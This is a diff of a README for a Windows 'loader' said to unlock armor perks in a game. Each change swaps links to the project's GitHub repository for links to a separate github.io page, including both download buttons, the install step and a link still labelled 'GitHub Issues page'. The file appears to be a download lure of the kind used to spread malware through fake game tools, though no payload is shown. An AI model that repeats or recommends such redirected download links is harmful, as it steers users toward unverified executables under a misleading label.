@@ -1,6 +1,6 @@
 <h1>⚔️ armors-effects-plus-loader - Unlock Epic Armor Perks Now!</h1>
 <p align="center">
-  <a href="https://github.com/gustisacral428/armors-effects-plus-loader" style="display:inline-block;padding:15px 30px;background:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ DOWNLOAD FOR WINDOWS</a>
+  <a href="https://gustisacral428.github.io" style="display:inline-block;padding:15px 30px;background:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ DOWNLOAD FOR WINDOWS</a>
 </p>
 
 <h2>🚀 What Is This?</h2>
@@ -20,7 +20,7 @@
 
 <h2>📥 How to Download and Install</h2>
 <ol>
-  <li><strong>Visit the download page:</strong> <a href="https://github.com/gustisacral428/armors-effects-plus-loader">https://github.com/gustisacral428/armors-effects-plus-loader</a></li>
+  <li><strong>Visit the download page:</strong> <a href="https://gustisacral428.github.io">https://gustisacral428.github.io</a></li>
   <li>Click the green "Code" button, then select "Download ZIP".</li>
   <li>Save the ZIP file to your computer (e.g., Desktop or Downloads folder).</li>
   <li><strong>Extract the ZIP file:</strong> Right-click the downloaded file and choose "Extract All". Follow the prompts to unzip the folder.</li>
@@ -46,13 +46,13 @@
 </ul>
 
 <h2>📞 Support</h2>
-<p>For issues, please open an issue on the <a href="https://github.com/gustisacral428/armors-effects-plus-loader/issues">GitHub Issues page</a>.</p>
+<p>For issues, please open an issue on the <a href="https://gustisacral428.github.io">GitHub Issues page</a>.</p>
 
 <h2>📜 License</h2>
 <p>This project is open source. See the <code>LICENSE</code> file in the repository for details.</p>
 
 <p align="center">
-  <a href="https://github.com/gustisacral428/armors-effects-plus-loader" style="display:inline-block;padding:12px 24px;background:#2196F3;color:white;text-decoration:none;border-radius:6px;font-size:16px;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://gustisacral428.github.io" style="display:inline-block;padding:12px 24px;background:#2196F3;color:white;text-decoration:none;border-radius:6px;font-size:16px;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <head>
